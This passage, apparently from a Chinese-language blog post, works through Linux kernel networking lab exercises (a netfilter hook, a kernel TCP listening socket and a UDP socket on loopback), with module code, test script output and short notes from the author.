class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* register filter device */</span></span><br><span class="line">	err = register_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), <span class="number">1</span>, MY_DEVICE);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	atomic_set(&amp;ioctl_set, <span class="number">0</span>);</span><br><span class="line">	ioctl_set_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* init &amp; add device */</span></span><br><span class="line">	cdev_init(&amp;my_cdev, &amp;my_fops);</span><br><span class="line">	cdev_add(&amp;my_cdev, MKDEV(MY_MAJOR, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: register netfilter hook */</span></span><br><span class="line">	err = nf_register_net_hook(&amp;init_net,&amp;my_nfho);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/* cleanup */</span></span><br><span class="line">	cdev_del(&amp;my_cdev);</span><br><span class="line">	unregister_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">my_hook_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: unregister hook */</span></span><br><span class="line">	nf_unregister_net_hook(&amp;init_net,&amp;my_nfho);</span><br><span class="line">	<span class="comment">/* cleanup device */</span></span><br><span class="line">	cdev_del(&amp;my_cdev);</span><br><span class="line">	unregister_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_hook_init);</span><br><span class="line">module_exit(my_hook_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/networking/<span class="number">1</span><span class="number">-2</span>-netfilter/user# ./test<span class="number">-1.</span>sh                 </span><br><span class="line">filter: loading out-of-tree <span class="keyword">module</span> taints kernel.                               </span><br><span class="line">IP address is <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">45934</span>                                                   </span><br><span class="line">Should show up in filter.                                                       </span><br><span class="line">Check dmesg output.   </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/networking/<span class="number">1</span><span class="number">-2</span>-netfilter/user# ./test<span class="number">-2.</span>sh                 </span><br><span class="line">IP address is <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">45936</span>                                                   </span><br><span class="line">Should show up in filter.                                                       </span><br><span class="line">Should NOT show up in filter.                                                   </span><br><span class="line">Check dmesg output.  </span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>nc</code> 命令时，hook 函数 <code>my_nf_hookfn</code> 被执行了</li>
<li>当 <code>my_ioctl</code> 的 MY_IOCTL_FILTER_ADDRESS 命令执行以后，效验模块开启，由于 <code>ioctl_set_addr != iph-&gt;daddr</code> 因此 hook 函数没有执行</li>
<li>PS：当时眼瞎把 <code>nf_hook_ops</code> 初始化错了，导致后面一直报错，调试了很久</li>
</ul>
<p>2.tcp-sock：</p>
<ul>
<li>编写一个内核模块，该模块创建一个 TCP 套接字，该套接字侦听环回接口上的端口 60000 上的连接（以 init_module 为单位）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Networking Lab (#10)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exercise #3, #4: simple kernel TCP socket</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Code skeleton.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple kernel TCP socket&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_TCP_PORT		60000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTEN_BACKLOG		5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ON			1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFF			0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG			ON</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG == ON</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG(s)					\</span></span><br><span class="line"><span class="meta">	do &#123;					\</span></span><br><span class="line"><span class="meta">		printk(KERN_DEBUG s <span class="meta-string">&quot;\n&quot;</span>);	\</span></span><br><span class="line"><span class="meta">	&#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG(s)					\</span></span><br><span class="line"><span class="meta">	do &#123;&#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> print_sock_address(addr)		\</span></span><br><span class="line"><span class="meta">	do &#123;					\</span></span><br><span class="line"><span class="meta">		printk(LOG_LEVEL <span class="meta-string">&quot;connection established to &quot;</span>	\</span></span><br><span class="line"><span class="meta">				<span class="meta-string">&quot;%pI4:%d\n&quot;</span>,	 		\</span></span><br><span class="line"><span class="meta">				&amp;addr.sin_addr.s_addr,		\</span></span><br><span class="line"><span class="meta">				ntohs(addr.sin_port));		\</span></span><br><span class="line"><span class="meta">	&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span>	<span class="comment">/* listening (server) socket */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">new_sock</span>;</span>	<span class="comment">/* communication socket */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">my_tcp_sock_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="comment">/* address to bind on */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> =</span> &#123;</span><br><span class="line">		.sin_family	= AF_INET,</span><br><span class="line">		.sin_port	= htons(MY_TCP_PORT),</span><br><span class="line">		.sin_addr	= &#123; htonl(INADDR_LOOPBACK) &#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> addrlen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">	<span class="comment">/* address of peer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">raddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: create listening socket */</span></span><br><span class="line">	err = sock_create_kern(&amp;init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &amp;sock);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;socket create wrong&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 1: bind socket to loopback on port MY_TCP_PORT */</span></span><br><span class="line">	err = sock-&gt;ops-&gt;bind(sock, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;bind wrong!&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release;             </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/* TODO 1: start listening */</span></span><br><span class="line">	err = sock-&gt;ops-&gt;listen(sock, LISTEN_BACKLOG);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;listen wrong!&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release;             </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/* TODO 2: create new socket for the accepted connection */</span></span><br><span class="line">	err = sock_create_lite(PF_INET, SOCK_STREAM, IPPROTO_TCP, &amp;new_sock);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;create socket&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	new_sock-&gt;ops = sock-&gt;ops;</span><br><span class="line">	<span class="comment">/* TODO 2: accept a connection */</span></span><br><span class="line">	err = sock-&gt;ops-&gt;accept(sock, new_sock, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;accept wrong&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release_new_sock;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 2: get the address of the peer and print it */</span></span><br><span class="line">	err = sock-&gt;ops-&gt;getname(new_sock, (struct sockaddr *) &amp;raddr, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;not find name&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release_new_sock;</span><br><span class="line">	&#125;</span><br><span class="line">	print_sock_address(raddr);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_release_new_sock:</span><br><span class="line">	<span class="comment">/* TODO 2: cleanup socket for accepted connection */</span></span><br><span class="line">	sock_release(new_sock);</span><br><span class="line">out_release:</span><br><span class="line">	<span class="comment">/* TODO 1: cleanup listening socket */</span></span><br><span class="line">	sock_release(sock);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">my_tcp_sock_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 2: cleanup socket for accepted connection */</span></span><br><span class="line">	sock_release(new_sock);</span><br><span class="line">	<span class="comment">/* TODO 1: cleanup listening socket */</span></span><br><span class="line">	sock_release(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_tcp_sock_init);</span><br><span class="line">module_exit(my_tcp_sock_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里的 <code>sock-&gt;ops-&gt;bind</code> <code>sock-&gt;ops-&gt;listen</code> <code>sock-&gt;ops-&gt;accept</code> 就是用户态同名函数的底层实现</li>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/networking/<span class="number">3</span><span class="number">-4</span>-tcp-sock# ./test<span class="number">-4.</span>sh                       </span><br><span class="line">+ sleep <span class="number">1</span>                                                                       </span><br><span class="line">+ insmod tcp_sock.ko                                                            </span><br><span class="line">+ netstat -<span class="function">tuan                                                                 </span></span><br><span class="line"><span class="function">Active Internet <span class="title">connections</span> <span class="params">(servers <span class="keyword">and</span> established)</span>                           </span></span><br><span class="line"><span class="function">Proto Recv-Q Send-Q Local Address           Foreign Address         State       </span></span><br><span class="line"><span class="function">tcp        0      0 127.0.0.1:60000         0.0.0.0:*               LISTEN      </span></span><br><span class="line"><span class="function">+ echo+ sleep 3                                                                 </span></span><br><span class="line"><span class="function">+ ../netcat -q 4 127.0.0.1 60000 Should connect.                                </span></span><br><span class="line"><span class="function"> -p 60001                                                                       </span></span><br><span class="line"><span class="function">accept wrong                                                                    </span></span><br><span class="line"><span class="function">connection established to 127.0.0.1:60001                                       </span></span><br><span class="line"><span class="function">+ rmmod tcp_sock     </span></span><br></pre></td></tr></table></figure>
<ul>
<li>成功监听了目标端口</li>
</ul>
<p>3.udp-sock：</p>
<ul>
<li>编写一个内核模块，用于创建 UDP 套接字，并将消息从套接字上的 MY_TEST_MESSAGE 宏发送到端口 60001 上的环回地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Networking Lab (#10)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Bonus: simple kernel UDP socket</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Code skeleton.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple kernel UDP socket&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_UDP_LOCAL_PORT	60000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_UDP_REMOTE_PORT	60001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_TEST_MESSAGE		<span class="meta-string">&quot;kernelsocket\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ON			1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFF			0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG			ON</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG == ON</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG(s)					\</span></span><br><span class="line"><span class="meta">	do &#123;					\</span></span><br><span class="line"><span class="meta">		printk(KERN_DEBUG s <span class="meta-string">&quot;\n&quot;</span>);	\</span></span><br><span class="line"><span class="meta">	&#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG(s)					\</span></span><br><span class="line"><span class="meta">	do &#123;&#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> print_sock_address(addr)		\</span></span><br><span class="line"><span class="meta">	do &#123;					\</span></span><br><span class="line"><span class="meta">		printk(LOG_LEVEL <span class="meta-string">&quot;connection established to &quot;</span>	\</span></span><br><span class="line"><span class="meta">				NIPQUAD_FMT <span class="meta-string">&quot;:%d\n&quot;</span>, 		\</span></span><br><span class="line"><span class="meta">				NIPQUAD(addr.sin_addr.s_addr),	\</span></span><br><span class="line"><span class="meta">				ntohs(addr.sin_port));		\</span></span><br><span class="line"><span class="meta">	&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span>	<span class="comment">/* UDP server */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* send datagram */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_udp_msgsend</span><span class="params">(struct socket *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* address to send to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">raddr</span> =</span> &#123;</span><br><span class="line">		.sin_family	= AF_INET,</span><br><span class="line">		.sin_port	= htons(MY_UDP_REMOTE_PORT),</span><br><span class="line">		.sin_addr	= &#123; htonl(INADDR_LOOPBACK) &#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> raddrlen = <span class="keyword">sizeof</span>(raddr);</span><br><span class="line">	<span class="comment">/* message */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="keyword">char</span> *buffer = MY_TEST_MESSAGE;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: build message */</span></span><br><span class="line">	iov.iov_base = buffer;</span><br><span class="line">	iov.iov_len = len;</span><br><span class="line">	msg.msg_flags = <span class="number">0</span>;</span><br><span class="line">	msg.msg_name = &amp;raddr;</span><br><span class="line">	msg.msg_namelen = raddrlen;</span><br><span class="line">	msg.msg_control = <span class="literal">NULL</span>;</span><br><span class="line">	msg.msg_controllen = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* TODO 1: send the message down the socket and return the</span></span><br><span class="line"><span class="comment">	 * error code.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> kernel_sendmsg(s, &amp;msg, (struct kvec *) &amp;iov, <span class="number">1</span>, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">my_udp_sock_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="comment">/* address to bind on */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> =</span> &#123;</span><br><span class="line">		.sin_family	= AF_INET,</span><br><span class="line">		.sin_port	= htons(MY_UDP_LOCAL_PORT),</span><br><span class="line">		.sin_addr	= &#123; htonl(INADDR_LOOPBACK) &#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> addrlen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: create UDP socket */</span></span><br><span class="line">	err = sock_create_kern(&amp;init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &amp;sock);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;can&#x27;t create socket\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 1: bind socket to loopback on port MY_UDP_LOCAL_PORT */</span></span><br><span class="line">	err = sock-&gt;ops-&gt;bind(sock, (struct sockaddr *) &amp;addr, addrlen);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;can&#x27;t bind socket\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* send message */</span></span><br><span class="line">	err = my_udp_msgsend(sock);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;can&#x27;t send message\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_release:</span><br><span class="line">	<span class="comment">/* TODO 1: release socket */</span></span><br><span class="line">	sock_release(sock);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">my_udp_sock_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: release socket */</span></span><br><span class="line">	sock_release(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_udp_sock_init);</span><br><span class="line">module_exit(my_udp_sock_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>本实验算一个比较套路的过程，把 <code>msghdr</code> 和 <code>iovec</code> 填充好就行了</li>
<li>结果：</li>
</ul>
